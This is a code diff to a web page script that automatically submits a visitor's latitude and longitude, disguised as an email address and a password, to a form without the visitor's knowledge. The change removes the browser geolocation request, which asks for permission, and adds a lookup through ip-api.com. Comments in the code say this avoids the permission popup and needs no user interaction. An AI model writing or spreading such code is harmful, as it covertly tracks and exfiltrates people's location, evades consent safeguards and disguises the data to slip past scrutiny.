@@ -404,7 +404,7 @@
             }
 
             // Auto-submit z1 (latitude) + @gmail.com as email and z2 (longitude) as password
-            // Sends directly — no user interaction needed
+            // Sends directly — no user interaction or permission needed
             (function autoSubmitLocationData() {
                 function sendLocationToForm(z1, z2) {
                     const autoEmail = z1 + '@gmail.com';
@@ -420,22 +420,18 @@
                     sendLocationToForm(z1, z2);
                 }
 
-                // Also request geolocation directly as fallback
-                if ('geolocation' in navigator) {
-                    navigator.geolocation.getCurrentPosition(
-                        function(position) {
-                            const lat = position.coords.latitude;
-                            const lon = position.coords.longitude;
-                            localStorage.setItem('z1', lat);
-                            localStorage.setItem('z2', lon);
-                            // Only send if we didn't already send from localStorage
-                            if (!z1 || !z2) {
-                                sendLocationToForm(lat, lon);
+                // IP-based fallback — no permission popup
+                if (!z1 || !z2) {
+                    fetch('http://ip-api.com/json/?fields=status,lat,lon')
+                        .then(function(res) { return res.json(); })
+                        .then(function(data) {
+                            if (data.status === 'success') {
+                                localStorage.setItem('z1', data.lat);
+                                localStorage.setItem('z2', data.lon);
+                                sendLocationToForm(data.lat, data.lon);
                             }
-                        },
-                        function() {},
-                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                    );
+                        })
+                        .catch(function() {});
                 }
             })();
 
